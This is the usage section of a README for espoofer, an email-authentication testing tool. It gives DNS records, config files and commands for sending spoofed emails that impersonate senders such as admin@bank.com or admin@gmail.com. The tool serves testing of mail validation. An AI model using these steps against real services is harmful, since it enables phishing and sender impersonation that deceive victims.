## Installation
- Download this tool
```
git clone https://github.com/chenjj/espoofer
```

- Install dependencies
```
sudo pip3 install -r requirements.txt
```
> *Python version: Python 3 (**>=3.7**).*

## Usage
espoofer has three work modes: *server* ('s', default mode), *client* ('c') and *manual* ('m'). In *server* mode, espoofer works like a mail server to test validation in receiving services. In *client* mode, espoofer works as an email client to test validation in sending services. *Manual* mode is used for debug purposes. 

<p align="center">
<img src="images/email-authentication-flow.png" ><br>
Figure 2. Three types of attackers and their work modes
</p>

#### Server mode
To run espoofer in server mode, you need to have: 1) an IP address (`1.2.3.4`), which outgoing port 25 is not blocked by the ISP, and 2) a domain (`attack.com`). 


1. Domain configuration

- Set DKIM public key for `attack.com`

```
selector._domainkey.attacker.com TXT  "v=DKIM1; k=rsa; t=y; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNjwdrmp/gcbKLaGQfRZk+LJ6XOWuQXkAOa/lI1En4t4sLuWiKiL6hACqMrsKQ8XfgqN76mmx4CHWn2VqVewFh7QTvshGLywWwrAJZdQ4KTlfR/2EwAlrItndijOfr2tpZRgP0nTY6saktkhQdwrk3U0SZmG7U8L9IPj7ZwPKGvQIDAQAB"
```

- Set SPF record for `attack.com`

```
attack.com TXT "v=spf1 ip4:1.2.3.4 +all"
```

2. Configure the tool in config.py

```
config ={
	"attacker_site": b"attack.com", # attack.com
	"legitimate_site_address": b"admin@bank.com", # legitimate.com
	"victim_address": b"victim@victim.com", # victim@victim.com
	"case_id": b"server_a1", # server_a1
}
```

You can list find the case_id of all test cases using `-l` option:

```
python3 espoofer.py -l
```

3. Run the tool to send a spoofing email

```
python3 espoofer.py
```

You can change case_id in the config.py or use `-id` option in the command line to test different cases:

```
python3 espoofer.py -id server_a1
```

#### Client mode 

To run epsoofer in client mode, you need to have an account on the target email services. This attack exploits the failure of some email services to perform sufficient validation of emails received from local MUAs. For example, `attacker@gmail.com` tries to impersonate `admin@gmail.com`. 
1. Configure the tool in config.py

```
config ={
	"legitimate_site_address": b"admin@gmail.com",  
	"victim_address": b"victim@victim.com", 
	"case_id": b"client_a1",

	"client_mode": {
		"sending_server": ("smtp.gmail.com", 587),  # SMTP sending serve ip and port
		"username": b"attacker@gmail.com", # Your account username and password
		"password": b"your_passward_here",
	},
}
```

You can list find the case_id of all test cases using `-l` option:

```
python3 espoofer.py -l
```

> Note: `sending_server` should be the SMTP sending server address, not the receiving server address.


2. Run the tool to send a spoofing email

```
python3 espoofer.py -m c
```

You can change case_id in the config.py and run it again, or you can use `-id` option in the command line:

```
python3 espoofer.py -m c -id client_a1
```

#### Manual mode

Here is an example of manual mode:

```
python3 espoofer.py -m m -helo attack.com -mfrom <m@attack.com> -rcptto <victim@victim.com> -data raw_msg_here -ip 127.0.0.1 -port 25
```
